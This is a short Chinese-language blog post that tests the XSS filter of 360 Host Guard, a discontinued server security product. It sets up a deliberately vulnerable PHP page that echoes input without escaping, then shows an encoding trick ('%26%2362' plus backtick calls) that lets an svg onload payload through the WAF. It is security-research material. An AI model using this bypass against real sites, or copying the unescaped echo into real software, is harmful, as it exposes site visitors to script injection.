### 前言
- - -
360主机卫士是360旗下的服务器安全软件，为站长免费提供网站后门检测、木马查杀，网站补丁、漏洞防护等服务...

![1](https://ae01.alicdn.com/kf/Uad2732ca0c4943088ca09f550ff5caccL.png)

(虽然软件几年前就停止更新，官网挂了，但是从当时的评论上看软件还是很不错的。)

### 环境
- - -
火狐

360主机卫士Apache版

phpStudy2016(PHP-5.4.45+Apache)

测试代码
```
<?php   
  $input = @$_REQUEST["xss"];
  echo "<div>".$input."</div>"
?>
```
### 测试
- - -
习惯性的直接上 Burp 用平时收集的 payload fuzz 一遍，结果不怎么理想，能过的很鸡肋...然后我就去网上找资料，找到了一篇文章[xss加入某些字符即可过大多数waf的思路及一些思考](https://mp.weixin.qq.com/s/CCc12FWWJMRP4V6x0XXaoA)根据里面的思路可以绕过。

`<svg onload>` 拦截

`<svg > onload>`不拦截

具体绕过就是先把 `>` html实体编码

![2](https://ae01.alicdn.com/kf/Ue6dc8da4a8ac4497a96828e039c729574.png)

将 `&#62` URL编码

![3](https://ae01.alicdn.com/kf/U143681d1e9b64df0b67ebab674991c93N.png)

大部分 `xss payload` 加上 `%26%2362` 即可绕过，但是类似 alert(1) 括号可能会被拦截 可以用反引号替换
```
<svg %26%2362 onload=alert`1`>
```

